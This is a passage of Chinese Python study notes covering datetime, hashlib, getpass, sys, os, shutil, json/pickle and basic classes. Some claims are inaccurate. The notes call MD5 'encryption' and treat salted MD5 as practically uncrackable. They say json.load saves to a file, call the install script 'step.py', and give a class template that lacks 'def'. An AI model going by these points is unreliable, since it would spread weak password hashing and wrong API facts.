<li><p>缺点：无法写入文本，无法传输，必须要将其转换为字符串类型才行</p>
<p>datetime.datetime.now()</p>
</li>
</ul>
</li>
<li><p>将datetime类型格式化成字符串类型：</p>
<p>字符串类型时间：</p>
<ul>
<li><p>优点：可以进行写入，传输等操作</p>
</li>
<li><p>缺点：进行时间的相加，比如加天数，需要人工计算，年份，月份等无法自动变更</p>
<p>a = datetime.datetime.now()</p>
<p>a.strftime(‘%Y-%m-%d-%H-%M-%’)</p>
</li>
<li><p>易错点：除了月m和天d是小写，其余的全部是大写</p>
</li>
</ul>
</li>
<li><p>将字符串类型时间转化为datetime类型时间</p>
<p>语法：datetime.datetime.strptime(待转化的字符串，字符串的格式)</p>
<p>注意点：因为字符串并不是类datetime里面，无法直接使用strptime，所以需要一步一步的调用，所以前面需要两个datetime</p>
<p>易错点：接收的参数里第二个参数，必须是字符串的格式，如果和字符串的格式不一致，将无法转换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#字符串时间类型和datetime时间类型互转import datetimea = datetime.datetime.now()b = a.strftime(&#x27;%Y-%m-%d-%H-%M%S&#x27;)  #将datetime类型转换为字符串类型时间print(b)   #结果为：2020-05-04-20-2753c = datetime.datetime.strptime(b,r&#x27;%Y-%m-%d-%H-%M%S&#x27;) #将字符串转换为datetime类型# 易错点：第一个参数为待转化的字符串类型，第二个参数，为字符串类型的基本格式print(c)  #2020-05-04 20:27:53</span></span><br></pre></td></tr></table></figure></li>
<li><p>获取UTC时间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime<span class="comment">#两个时间相差8小时time_current = datetime.datetime.now()  #获取本地时间，也就是当前时区时间print(time_current) #结果为：2020-05-04 19:52:49.487337time = datetime.datetime.utcnow()  #UTC时间，也就是格林尼治时间print(time) #结果为：2020-05-04 11:51:23.988447</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p>增量时间</p>
<p>适用类型：datetime类型</p>
<p>主要用途：实现datetime类型的加减</p>
<p>参数：days ,hours,miniutes,…</p>
<p>示例：让当前时间 + 7小时  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetimea = datetime.datetime.now()   <span class="comment">#当前时间b = datetime.timedelta(hours=7)  #增量时间c = a + b                #当前时间  + 增量时间print(a,c,sep=&#x27;\n&#x27;) </span></span><br></pre></td></tr></table></figure></li>
<li><p>获取其他时区的当前时间：</p>
<p>分为这几步：</p>
<ul>
<li>根据时区设置增量时间，这里是 7小时</li>
<li>将增量时间和时区函数(datetime.timezone)结合，表示需要的时区</li>
<li>将获取当前时间的函数(datetime.datetime.now())与时区结合，即可获取指定时区的当前时间</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取其他时区的当前时间import datetimetime_add = datetime.timedelta(hours=7)    #增量时间time_zone7 = datetime.timezone(time_add)    #通过增量时间，来表示东7区b = datetime.datetime.now(  time_zone7 )   #获取东7区的当前时间print(b)  #结果为：2020-05-04 19:14:18.284052+07:00 ，此时我国(东8区)，时间为2020-05-04 20:14:18.284052+07:00</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p>时间戳和当前时间(datetime类型)互转</p>
<p>从时间戳转当前时间：对应函数的字面意思，from        stamptime(时间戳)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将时间戳转化为当前时间（datetime类型）import datetime,timea = time.time()   #结果为：1588595706.230431b = datetime.datetime.fromtimestamp(a)   #结果为：2020-05-04 20:35:06.230431print(a,b,sep=&#x27;\n&#x27;)</span></span><br></pre></td></tr></table></figure>



<p>当前时间(datetime类型)转时间戳：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将当前时间（datetime类型）转化为时间戳import datetime,timea = time.time()                              #结果为：1588595914.3423343b = datetime.datetime.fromtimestamp(a)      #结果为：2020-05-04 20:38:34.342334c = datetime.datetime.timestamp(b)          #结果为：1588595914.342334print(a,b,c,sep=&#x27;\n&#x27;)    </span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="6-2-3-hashlib模块"><a href="#6-2-3-hashlib模块" class="headerlink" title="6.2.3 hashlib模块"></a>6.2.3 hashlib模块</h4><p>常用函数：</p>
<ul>
<li><p>md5():</p>
<p>md5加密原理上无法破解的原因：</p>
<ul>
<li>具有不可逆特性，无法通过加密后的密文还原成原始数据</li>
</ul>
<p>md5解密实现的原理：</p>
<ul>
<li>通过电脑24小时不间断生成随机字符串，然后将该字符串进行md5加密，并且将该随机字符串和其加密后的密文一起加入到数据库中，形成对应关系，通过此方法累积大量的 字符串–密文   相对应的数据，以后一旦客户需要解密，只需要在数据库中查找该加密密文，如果数据库中有，那么根据数据库中字符串和密文的对应关系，既可以找到字符串，该字符串就是用户提交的密文未加密前的数据。</li>
</ul>
<p>防止md5数据被解密的方法：</p>
<ul>
<li>原理：尽可能使原始数据复杂，位数更长，那么别人破解起来难度将更难，只要密码够复杂，即可实现理论上的永久无法破解</li>
<li>实现方法：通过给md5()函数加参数来实现 ‘加盐’  ，从而增加破解的难度</li>
</ul>
<p>md5()的参数的特性：</p>
<ul>
<li><p>不加参数：加密的数据可以通过网上的解密平台解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#未加‘盐’的md5加密：可被破解def encryption_md5(message):    &#x27;&#x27;&#x27;对传递来的数据进行md5加密&#x27;&#x27;&#x27;    import hashlib         #导入加密模块    data = hashlib.md5()   #调用md5()函数    data.update(message.encode(&#x27;utf-8&#x27;))    #因为python3的编码是unicode，但是hash的特性是必须要utf-8编码才行    # 所以这里将其编码成utf-8    return data.hexdigest()    #返回16进制的字符串值pwd = &#x27;123456&#x27;result = encryption_md5(pwd)print(result)  #e10adc3949ba59abbe56e057f20f883e</span></span><br></pre></td></tr></table></figure>

<p>测试图：</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/20200425124215.png" alt="image-20200425124213385"></p>
</li>
<li><p>加参数：则无法解密，参数越长，越难解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#加‘盐’后的md5加密：‘盐’越复杂，越不可被破解def encryption_md5(message):    &#x27;&#x27;&#x27;对传递来的数据进行md5加密：加强版(不易被解密)&#x27;&#x27;&#x27;    import hashlib         #导入加密模块    data = hashlib.md5(&#x27;这是一个盐，是为了防止解密，也需要转换为utf-8编码&#x27;.encode(&#x27;utf-8&#x27;))   #有参数，则代表加‘盐’，可以防破解，这里也要进行编码转换    data.update(message.encode(&#x27;utf-8&#x27;))    #因为python3的编码是unicode，但是hash的特性是必须要utf-8编码才行    # 所以这里将其编码成utf-8    return data.hexdigest()    #返回16进制的字符串值pwd = &#x27;123456&#x27;result = encryption_md5(pwd)print(result)  #d821098c282d578fbfb647b9ef67460a</span></span><br></pre></td></tr></table></figure>

<p>测试图：</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/20200425124117.png" alt="image-20200425124115455"></p>
</li>
</ul>
</li>
</ul>
<p>总结：</p>
<ol>
<li>调用md5加盐或者不加盐，如果加盐需要将加盐的字符串编码转换为utf-8</li>
<li>对需要加密的数据进行加密，加密前需要将数据转换为utf-8编码</li>
<li>以特定的格式获取数据，一般是16进制的形式获取数据</li>
</ol>
<p>易错点：</p>
<ul>
<li>导入的模块时hashlib模块，而不是md5模块</li>
<li>不管是加的盐还是需要加密的数据，都必须要转换为utf-8编码</li>
<li>加密时的函数update需要自己手动打，在pycharm里输入首字母无法显示出该函数，需要自己输入</li>
<li>以特定格式显示加密后的密文的函数，必须要是16进制显示</li>
</ul>
<h4 id="6-2-4-getpass模块"><a href="#6-2-4-getpass模块" class="headerlink" title="6.2.4 getpass模块"></a>6.2.4 getpass模块</h4><p>模块特点：密码相关</p>
<p>函数：</p>
<ul>
<li><p>getpass():让我们输入的密码不显示</p>
<p>适用场景：输密码时旁边有人.</p>
<p>缺点：在windows上使用，必须要用dos命令行打开才能运行，用pycharm都无法正常运行</p>
<p>实际应用场景：linux系统，因为linux主要是命令行界面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;运行本程序注意点：必须使用dos打开才能正常运行 右键---Open in Terminal缺点：在windows上使用有问题，无法正常使用使用地点：在命令窗口（dos，cmd命令窗口）才能使用实际应用场景：linux系统中，因为linux主要是命令行界面，所以linux可以正常使用&#x27;&#x27;&#x27;</span><span class="comment">#导入getpass模块import getpassgetpass.getpass()  #调用函数，不加参数默认提示语为：Password: （只有在命令行界面才会显示）getpass.getpass(prompt=&#x27;请输入密码：&#x27;)  #修改提示语pwd = getpass.getpass(&#x27;请输入密码：&#x27;)  #将获取的密码赋值给pwdprint(pwd)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="6-2-5-sys模块"><a href="#6-2-5-sys模块" class="headerlink" title="6.2.5 sys模块"></a>6.2.5 sys模块</h4><p>模块特点：和解释器相关</p>
<p>常用函数：</p>
<ul>
<li><p>查看一个数据被多少个变量指向:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sysa = [<span class="number">1</span>,<span class="number">2</span>]<span class="built_in">print</span>(sys.getrefcount(a))  <span class="comment">#查找指向[1,2]的变量个数，因为调用本函数，相当于也是一次指向，所以a和本函数一共2次指向</span></span><br></pre></td></tr></table></figure></li>
<li><p>查看递归的上限:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#必须要在命令行窗口运行才会显示import syssys.getrecursionlimit()</span></span><br></pre></td></tr></table></figure></li>
<li><p>修改默认递归的次数:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys.setrecursionlimit()</span><br></pre></td></tr></table></figure></li>
<li><p>在执行脚本前，接收参数:sys.argv()</p>
<p>前提：在命令行界面执行</p>
<p>功能：</p>
<ul>
<li>接收的第一个参数脚本名（脚本名始终是该列表的第一个元素）</li>
<li>接收的参数都在一个列表里</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#命令窗口执行：python 测试专用.py  狗屎import sys       a = sys.argv   #将接受来的参数赋值给变量a,此时a是一个变量print(a)   #结果为：[&#x27;测试专用.py&#x27;, &#x27;狗屎&#x27;]，第一个是脚本名，第二个是传入的参数</span></span><br></pre></td></tr></table></figure></li>
<li><p>退出程序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#直接退出程序：后续代码不再执行import sys           #导入模块sys.exit()    #退出程序，后面的代码不会被执行print(10)   #该行代码不会被执行</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>查看解释器查找模块的默认路径：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看找模块的默认路径import sysprint(sys.path)</span></span><br></pre></td></tr></table></figure>

<p>修改解释器找模块的默认路径：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#新增解释器找模块的路径import syssys.path.append(&#x27;路径&#x27;)  #参数必须是一个路径</span></span><br></pre></td></tr></table></figure>



<h4 id="6-2-6-os模块"><a href="#6-2-6-os模块" class="headerlink" title="6.2.6 os模块"></a>6.2.6 os模块</h4><p>模块特点：和操作系统相关</p>
<p>常用函数：</p>
<ul>
<li><p>获取文件大小</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os size = os.stat(<span class="string">&#x27;gitee作业地址.md&#x27;</span>).st_size    <span class="comment">#读取文件大小,读取的是byteprint(size)</span></span><br></pre></td></tr></table></figure></li>
<li><p>判断路径是否存在</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#判断路径是否存在import os   status = os.path.exists(&#x27;E:\oldboy_python\code\测试.txt&#x27;)print(status)</span></span><br></pre></td></tr></table></figure></li>
<li><p>获取文件的绝对路径</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取绝对路径import osstatus = os.path.abspath(&#x27;测试.txt&#x27;)   #获取测试.txt所在的绝对路径print(status)  #结果为：E:\oldboy_python\code\测试.txt</span></span><br></pre></td></tr></table></figure></li>
<li><p>获取路径的上层目录:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取路径的上层目录import osstatus = os.path.dirname(&#x27;E:\oldboy_python\code\测试.txt&#x27;)  #获取上层目录print(status)  #结果为：E:\oldboy_python\code</span></span><br></pre></td></tr></table></figure></li>
<li><p>路径拼接</p>
<p>易错点：第二个参数如果也为路径，可能会对对一个参数的路径进行覆盖</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#路径拼接import osstatus = os.path.join(r&#x27;E:\oldboy_python&#x27;,&#x27;狗屎&#x27;) #第一个参数为路径，第二个参数为待拼接字符串print(status)  #结果为：E:\oldboy_python\狗屎</span></span><br></pre></td></tr></table></figure></li>
<li><p>查看文件夹下的所有文件（当前第一层文件夹）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看文件夹下的所有文件（层级一）import osstatus = os.listdir(r&#x27;E:\oldboy_python&#x27;)   #列出文件夹里的所有东西，当前层级的目录和文件#不加参数，默认列出当前脚本所在目录的文件夹的所有文件和文件夹print(status)  #结果为：[&#x27;.git&#x27;, &#x27;code&#x27;, &#x27;upload&#x27;, &#x27;尹成code&#x27;, &#x27;思维导图&#x27;, &#x27;数据类型方法.md&#x27;, &#x27;老男孩python笔记.md&#x27;]</span></span><br></pre></td></tr></table></figure></li>
<li><p>查看文件夹下所有文件（所有层级）：walk</p>
<p>特点：</p>
<ul>
<li><p>不用for循环进行遍历，则不抓取数据，所以必须要搭配for循环使用</p>
</li>
<li><p>walk获得的是一个元组，总共有多少层文件夹，就有多少个元素</p>
</li>
<li><p>列表里的每个元素3部分组成：</p>
<p>第一部分：当前文件夹的绝对路径</p>
<p>第二部分：当前文件夹下的所有文件夹名字，放在一个列表里，如果当前文件夹下没有文件夹，那么该列表为[]</p>
<p>第三部分：当前文件夹下所有的文件的名字，放在一个列表里</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看文件夹下每一层文件夹里的数据import osstatus = os.walk(r&#x27;E:\手机&#x27;)   #只是抓取，不配合for遍历，就不显示for i in status:   #遍历每一个元素：相当于i就是每一层文件夹里的数据：包含该层文件夹的绝对路径，该层文件夹下的所有文件夹名，该层文件夹下的所有文件    print(i)   #打印每一层文件夹里的数据#结果为第一层文件夹：(&#x27;E:\\手机&#x27;, [&#x27;w大&#x27;], [&#x27;小米手机助手3.2.1.zip&#x27;])#结果为第二层文件夹：(&#x27;E:\\手机\\w大&#x27;, [], [&#x27;miui11稳定版（W大）.zip&#x27;, &#x27;安全中心.rar&#x27;])</span></span><br></pre></td></tr></table></figure>



<p>练习：显示目录A里的目录B里的所有文件（文件名要和绝对路径拼接起来）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#写法一：推荐，直接在for循环的变量里对三个元素进行组合#查看目录下每一层目录里的数据import osstatus = os.walk(r&#x27;E:\手机&#x27;)for path_abs,folder_list,file_list in status:     #将status的每一个元素A里的三个元素分别赋值给path_abs,folder_list,file_list     for file in file_list:   #遍历所有的文件名        result = os.path.join(path_abs,file)    #文件名和当前文件所在的绝对路径进行拼接        print(result)#写法二：不推荐，这时笨办法，多了一条中转语句# #查看目录下每一层目录里的数据# import os# status = os.walk(r&#x27;E:\手机&#x27;)# for i in status:#     path_abs,folder,file = i     #中转语句#     for m in file:   #遍历所有的文件名#         result = os.path.join(path_abs,m)#         print(result)</span></span><br></pre></td></tr></table></figure></li>
<li><p>创建一级目录</p>
<p>特点：只能创建一层目录</p>
<p>易错点：如果创建多层目录，会报错；如果目录不存在，则报错</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#正确写法：创建一级目录import osos.mkdir(&#x27;一级目录&#x27;)  #创建一级目录#错误写法：创建多级目录：报错import osos.mkdir(&#x27;一级目录\二级目录&#x27;)  #报错：FileNotFoundError: [WinError 3] 系统找不到指定的路径。: &#x27;一级目录\\二级目录&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p>创建多级目录（推荐）：以后不管创建一级还是多级，都推荐这个命令</p>
<p>特点：既可以创建一层的目录，也可以创建多层目录</p>
<p>易错点：；如果目录不存在，则报错</p>
<p>使用技巧：创建目录前，得先判定目录存不存在，不存在，就创建，这样就可以避免错误。创建目录方法：os.path.exists(路径)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建多级目录import osos.makedirs(&#x27;一级目录\二级目录\三级目录&#x27;)  #创建多级目录</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p>目录重命名（一级）</p>
<p>接收参数：2个；第一个是原目录名称，第二个是修改后的目录名称</p>
<p>用法：os.rename()</p>
<p>注意点：如果对多级目录重命名，该语句就只对第一层的目录进行重命名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> osos.rename(<span class="string">&#x27;一级目录&#x27;</span>,<span class="string">&#x27;一级目录重命名&#x27;</span>)  <span class="comment">#目录重命名</span></span><br></pre></td></tr></table></figure></li>
<li><p>目录重命名（多级）</p>
<p>接收参数：2个；第一个是原目录名称，第二个是修改后的目录名称</p>
<p>用法：os.renames()</p>
<p>注意点：既可以对一级目录重命名，也可以对多级目录重命名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#多级目录重命名import osos.renames(&#x27;一级目录\二级目录\三级目录&#x27;,&#x27;一级目录重命名\二级目录重命名\三级目录重命名&#x27;)  #目录重命名</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="6-2-7-shutil模块"><a href="#6-2-7-shutil模块" class="headerlink" title="6.2.7 shutil模块"></a>6.2.7 shutil模块</h4><p>模块特点：文件操作相关</p>
<p>常用函数：</p>
<ul>
<li><p>删除文件夹（删除文件夹和里面的文件夹、文件）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除文件夹（包括内部的文件夹、文件）import shutil,os,timeos.mkdir(&#x27;删除文件夹测试&#x27;)    #创建文件夹time.sleep(5)        #延迟5秒，方便直观的观察文件夹的创建和删除shutil.rmtree(r&#x27;删除文件夹测试&#x27;)      #删除文件夹</span></span><br></pre></td></tr></table></figure></li>
<li><p>重命名</p>
<p>对文件夹重命名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#对文件夹重命名import shutilshutil.move(&#x27;./day16/重命名&#x27;,&#x27;./day16/重命名成功&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>对文件进行重命名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#对文件进行重命名import shutilshutil.move(&#x27;./day16/重命名成功/1&#x27;,&#x27;./day16/重命名成功/6&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>压缩</p>
<ul>
<li>参数3个：第一个参数为压缩后的名字，第二个参数为压缩的格式，第三个参数为待压缩的路径</li>
<li>易错点：如果第一个参数是一个路径，比如  test/a   那么，当我们压缩的时候，实际上就是将一个东西压缩，并切压缩后的压缩包为    a.zip，并且该压缩包还在test文件夹下，具体应用实例，可以参考练习题：基于时间的解压缩</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> shutil<span class="comment">#压缩文件：第一个参数时待压缩路径，第二个参数时压缩格式，第三个参数为待压缩的路径shutil.make_archive(&#x27;重命名&#x27;,&#x27;zip&#x27;,&#x27;重命名成功&#x27;)  #因为重命名成功这个文件夹和脚本处于同一目录下，所以这里路径只写目录名字也可以</span></span><br></pre></td></tr></table></figure>

<p>解压</p>
<ul>
<li>第一个参数必须要有，第二个参数不指定，则默认解压到当前目录，如果指定目录不存在，则自动创建</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> shutil<span class="comment">#解压：不指定解压路径就默认解压到当前目录shutil.unpack_archive(&#x27;重命名成功.zip&#x27;)#解压：第二个参数可以指定解压路径，如果解压路径目录不存在，则自动创建shutil.unpack_archive(&#x27;重命名成功.zip&#x27;,&#x27;解压&#x27;)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>练习题：压缩与解压</p>
<ul>
<li><p>要求：文件夹day16下有文件夹module，现在需要基于时间，对moudle文件夹进行压缩，压缩文件到文件夹到B3里，B3不存在，然后再将压缩包解压到‘E:\解压测试   内’</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;要求：文件夹day16下有文件夹module，现在需要基于时间对moudle文件夹进行压缩，压缩文件到文件夹到B3里，B3不存在，然后再讲压缩包解压到‘E:\解压测试’&#x27;&#x27;&#x27;</span><span class="keyword">import</span> datetime,shutil,ostime_now = datetime.datetime.now()   <span class="comment">#获取当前时间time_now = time_now.strftime(&#x27;%Y-%m-%d-%H-%M-%S&#x27;)  #将时间格式化成指定样式if not os.path.exists(&#x27;B3&#x27;) :    #必须要判断    os.mkdir(&#x27;B3&#x27;)path = os.path.join(&#x27;B3&#x27;,time_now)  #新的路径，类似于B3/time_nowshutil.make_archive(path,&#x27;zip&#x27;,&#x27;moudle&#x27;)  #前提，B3目录得存在对moudle进行压缩，压缩后的文件在B3下的一个时间命名的压缩包file = path + &#x27;.zip&#x27;   #压缩包的名字shutil.unpack_archive(file,&#x27;E:\解压测试&#x27;)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="6-2-8-json、pickle模块"><a href="#6-2-8-json、pickle模块" class="headerlink" title="6.2.8 json、pickle模块"></a>6.2.8 json、pickle模块</h4><p>推荐：推荐使用json</p>
<p>功能：实现不同编程语言数据的转换</p>
<p>json的意义：实现了不同编程语言数据的交换，如果需要将python的数据给java使用，那么就需要首先将python的数据转换为json格式，然后再将json格式数据转换为java格式的数据，json相当于一个中间人</p>
<p>json的特点：</p>
<ul>
<li><p>相当于一个字符串</p>
</li>
<li><p>最外层必须是列表或者字典，内部由字符串、列表、字典构成</p>
</li>
<li><p>注意点：</p>
<p>json序列中不存在元组，元组会自动转换为列表；</p>
<p>json序列中不能有集合，否则会报错</p>
</li>
</ul>
<p>易错点：python内容里字符串使用的引号必须要使用双引号</p>
<ul>
<li>原因：大多数编程语言表示字符串都是用双引号，所以json规定表示字符串必须用双引号，否则容易导致不可预知的错误</li>
</ul>
<p>json和pickle的区别：</p>
<ul>
<li><p>json:</p>
<p>特点：生成的是一个字符串类型</p>
<p>缺点：只能转换字符串、列表、字典、整型、布尔等类型</p>
<p>优点：支持所有语言，生成的是字符串类型，便于阅读</p>
</li>
<li><p>pickle:</p>
<p>特点：生成的是一个bytes类型</p>
<p> 缺点：只支持python，只有在python中才有该模块；生成的数据是bytes类型，不便于阅读</p>
<p>优点：支持所有的数据类型，出了json支持的类型，还支持函数等数据类型</p>
</li>
</ul>
<p>常用函数：</p>
<ul>
<li><p>将数据转换为json格式：json.dumps()</p>
<p>易错点：区分和dump的区别，dumps仅仅做数据转换，并没有保存数据；dump还需要接收第二个参数，文件操作的函数，这样转换完的数据就直接存储到文件里了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dumps：将数据转换为json格式的字符串，无保存import jsona = &#123;&quot;测试&quot;:(1,2,&#123;&quot;id&quot;:66&#125;,&quot;daf&quot;)&#125;result = json.dumps(a)print(result)  #结果为：&#123;&quot;\u6d4b\u8bd5&quot;: [1, 2, &#123;&quot;id&quot;: 66&#125;, &quot;daf&quot;]&#125;pyt</span></span><br></pre></td></tr></table></figure>

<p>注意点：将数据转换为json格式，如果数据里有汉字，那么汉字会被转化为其他编码，这时，我们看json数据就不能很直观的看到汉字的内容</p>
<ul>
<li><p>解决方法：添加参数ensure_ascii = False</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json<span class="comment">#不加参数a = [&#x27;你好&#x27;,3,&#x27;66&#x27;]b = json.dumps(a)print(b)   #结果为：[&quot;\u4f60\u597d&quot;, 3, &quot;66&quot;]#加参数：更直观的观察json里的汉字c = json.dumps(a,ensure_ascii=False)print(c)  #结果为：[&quot;你好&quot;, 3, &quot;66&quot;]</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>将json转换为python格式：json.loads()</p>
<p>易错点：区分和load的区别，loads仅仅做数据转换，并没有保存数据；load还需要接收第二个参数，文件操作的函数，这样转换完的数据就直接存储到文件里了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dumps：将数据转换为json格式的字符串，无保存a = &#123;&quot;测试&quot;:(1,2,&#123;&quot;id&quot;:66&#125;,&quot;daf&quot;)&#125;result = json.dumps(a)print(result)  #结果为：&#123;&quot;\u6d4b\u8bd5&quot;: [1, 2, &#123;&quot;id&quot;: 66&#125;, &quot;daf&quot;]&#125;#loads：将json格式数据转换为python数据；无保存import jsonmessage = json.loads(result)   #将json格式数据转换为python数据print(message)   #&#123;&#x27;测试&#x27;: [1, 2, &#123;&#x27;id&#x27;: 66&#125;, &#x27;daf&#x27;]&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6-3-第三方模块"><a href="#6-3-第三方模块" class="headerlink" title="6.3  第三方模块"></a>6.3  第三方模块</h3><h4 id="6-3-1-安装第三方模块"><a href="#6-3-1-安装第三方模块" class="headerlink" title="6.3.1 安装第三方模块"></a>6.3.1 安装第三方模块</h4><p>两种方法：</p>
<ul>
<li><p>pip  install       模块名</p>
<p>在命令行窗口执行该命令来安装</p>
</li>
<li><p>源码安装</p>
<p>前提：下载源码包，然后解压，然后执行step.py</p>
</li>
</ul>
<h1 id="python学习笔记（老男孩s21）-1"><a href="#python学习笔记（老男孩s21）-1" class="headerlink" title="python学习笔记（老男孩s21）"></a>python学习笔记（老男孩s21）</h1><p>——————————-by：发飙的登山包——————————————</p>
<h2 id="第七章-面向对象"><a href="#第七章-面向对象" class="headerlink" title="第七章 面向对象"></a>第七章 面向对象</h2><p>ps：从此时开始，以后都用面向对象来写代码</p>
<h3 id="7-1-类和面向对象"><a href="#7-1-类和面向对象" class="headerlink" title="7.1 类和面向对象"></a>7.1 类和面向对象</h3><h4 id="7-1-1-类"><a href="#7-1-1-类" class="headerlink" title="7.1.1 类"></a>7.1.1 类</h4><p>类和其方法的特性：类和方法都可以作为变量使用</p>
<p>应用场景：</p>
<ul>
<li>函数多，需要分类</li>
<li>需要封装数据</li>
</ul>
<p>封装思想：</p>
<ul>
<li>可以通过模块来封装，将同一类的函数封装到同一个模块（自定义模块）里</li>
<li>可以通过类来对函数来进行封装</li>
</ul>
<p>基本格式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#命名类的基本格式：inner是类里面的方法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span>(<span class="params">objet</span>):</span></span><br><span class="line">    inner(self):   <span class="comment">#self必须要有，不能少</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>类的命名规则：</p>
<ul>
<li>一个单词时：只需要首字母大写</li>
<li>两个单词时：2个单词的首字母都要大写</li>
</ul>
<p>类的初始化：</p>
<ul>
<li><p>需要用初始化方法init</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#类的初始化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span>   <span class="comment">#特性：不需要对象的调用就会自动运行，这里一般用来封装数据</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">obj = Fun()   <span class="comment">#在示例一个对象的时候，初始化函数init就已经自动运行了，不需要调用</span></span><br></pre></td></tr></table></figure></li>
<li><p>类初始化方法的特性和作用：</p>
<p>特性：不需要调用，在实例化一个对象的时候就会自动运行</p>
<p>作用：主要是用给每一个对象来封装数据的</p>
<p>易错点：必须要有self这个形参</p>
</li>
</ul>
<p>读取和修改对象里的数据：</p>
<ul>
<li><p>读取数据基本格式：   对象.变量名</p>
</li>
<li><p>修改数据基本格式：  对象.变量名   =   ‘xxxx’</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">obj = Fun(<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;26&#x27;</span>)   <span class="comment">#封装数据，将这两个实参传递给初始化函数里的变量name,age</span></span><br><span class="line"><span class="comment">#读取对象里的数据：对象.变量</span></span><br><span class="line"><span class="built_in">print</span>(obj.name)     <span class="comment">#读取对象里的数据，结果为：张三</span></span><br><span class="line"><span class="built_in">print</span>(obj.age)     <span class="comment">#读取对象里的数据，结果为：26</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改对象里的数据</span></span><br><span class="line">obj.name = <span class="string">&#x27;李四&#x27;</span>   <span class="comment">#将张三修改为了李四</span></span><br><span class="line"><span class="built_in">print</span>(obj.name)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>方法和函数的区别：</p>
<ul>
<li>只有类里面的函数才叫做方法，其余的都叫函数</li>
</ul>
<p>易错点：</p>
<ul>
<li>类里面的方法必须要有形参  self</li>
